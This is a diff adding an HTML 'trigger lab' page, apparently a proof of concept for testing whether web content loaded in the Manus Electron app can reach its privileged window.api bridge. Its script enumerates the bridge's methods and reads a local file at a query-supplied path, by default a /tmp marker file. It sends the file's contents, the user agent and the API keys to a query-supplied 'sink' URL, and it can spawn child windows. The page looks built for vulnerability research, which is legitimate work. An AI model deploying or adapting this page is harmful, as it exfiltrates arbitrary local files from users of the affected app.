@@ -1,0 +1,188 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Manus trigger lab</title>
+    <style>
+      :root {
+        color-scheme: light dark;
+        font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      }
+      body {
+        margin: 0;
+        padding: 32px;
+        background: #f7f7f5;
+        color: #181818;
+      }
+      main {
+        max-width: 900px;
+        margin: 0 auto;
+      }
+      h1 {
+        margin: 0 0 8px;
+        font-size: 28px;
+      }
+      p {
+        margin: 0 0 20px;
+        color: #555;
+      }
+      .status {
+        display: grid;
+        gap: 12px;
+      }
+      .row {
+        border: 1px solid #ddd;
+        background: #fff;
+        border-radius: 8px;
+        padding: 14px;
+      }
+      .label {
+        font-weight: 700;
+      }
+      pre {
+        overflow: auto;
+        white-space: pre-wrap;
+        word-break: break-word;
+        margin: 8px 0 0;
+        padding: 12px;
+        border-radius: 6px;
+        background: #111;
+        color: #eee;
+      }
+      .ok {
+        color: #087b2f;
+      }
+      .bad {
+        color: #a30000;
+      }
+      @media (prefers-color-scheme: dark) {
+        body {
+          background: #111;
+          color: #eee;
+        }
+        p {
+          color: #aaa;
+        }
+        .row {
+          border-color: #333;
+          background: #1c1c1c;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <main>
+      <h1>Manus trigger lab</h1>
+      <p>This page checks whether it is running in a privileged Manus Electron renderer.</p>
+      <div id="status" class="status"></div>
+    </main>
+    <script>
+      const params = new URLSearchParams(location.search);
+      const markerPath = params.get("path") || "/tmp/manus-remote-trigger-marker.txt";
+      const expected = params.get("expect") || "";
+      const sink = params.get("sink") || "";
+      const spawnChild = params.get("spawnChild") === "1" && params.get("child") !== "1";
+      const rows = [];
+
+      function safeJson(value) {
+        try {
+          return JSON.stringify(value, null, 2);
+        } catch (error) {
+          return String(value);
+        }
+      }
+
+      function add(label, value, ok) {
+        rows.push({ label, value, ok });
+        render();
+      }
+
+      function render() {
+        const root = document.getElementById("status");
+        root.innerHTML = rows.map((row) => {
+          const klass = row.ok === true ? "ok" : row.ok === false ? "bad" : "";
+          return `<div class="row"><div class="label ${klass}">${escapeHtml(row.label)}</div><pre>${escapeHtml(safeJson(row.value))}</pre></div>`;
+        }).join("");
+      }
+
+      function escapeHtml(value) {
+        return String(value).replace(/[&<>"']/g, (ch) => ({
+          "&": "&amp;",
+          "<": "&lt;",
+          ">": "&gt;",
+          '"': "&quot;",
+          "'": "&#39;",
+        })[ch]);
+      }
+
+      async function report(payload) {
+        if (!sink) return;
+        const url = new URL(sink);
+        url.searchParams.set("payload", JSON.stringify(payload).slice(0, 1800));
+        await fetch(url.toString(), { mode: "no-cors" }).catch(() => {});
+      }
+
+      async function decodeBuffer(result) {
+        if (!result || !result.buffer) return null;
+        return new TextDecoder().decode(new Uint8Array(result.buffer));
+      }
+
+      async function tryRead(label, readFn) {
+        try {
+          const result = await readFn(markerPath);
+          const text = await decodeBuffer(result);
+          const matched = expected ? text === expected : Boolean(text);
+          const payload = {
+            path: markerPath,
+            name: result && result.name,
+            size: result && result.size,
+            type: result && result.type,
+            matched,
+            text,
+          };
+          add(label, payload, matched);
+          await report({ label, payload });
+        } catch (error) {
+          add(label, { error: error.message, path: markerPath }, false);
+        }
+      }
+
+      (async () => {
+        const api = window.api;
+        add("location", location.href);
+        add("userAgent", navigator.userAgent);
+        add("window.api present", Boolean(api), Boolean(api));
+        add("window.api keys", api ? Object.keys(api).sort() : []);
+
+        if (api && api.readFileAsArrayBuffer) {
+          await tryRead("typed readFileAsArrayBuffer", (path) => api.readFileAsArrayBuffer(path));
+        }
+
+        if (api && api.invoke) {
+          await tryRead("generic invoke read-file-as-array-buffer", (path) => api.invoke("read-file-as-array-buffer", path));
+        }
+
+        if (api && api.openChildWindow && spawnChild) {
+          try {
+            const childUrl = new URL(location.href);
+            childUrl.searchParams.set("child", "1");
+            api.openChildWindow(childUrl.toString());
+            add("openChildWindow", { opened: childUrl.toString() }, true);
+          } catch (error) {
+            add("openChildWindow", { error: error.message }, false);
+          }
+        }
+
+        document.title = api ? "Manus trigger lab: API PRESENT" : "Manus trigger lab: no API";
+        await report({
+          label: "summary",
+          hasApi: Boolean(api),
+          apiKeys: api ? Object.keys(api).sort() : [],
+          href: location.href,
+          userAgent: navigator.userAgent,
+        });
+      })();
+    </script>
+  </body>
+</html>
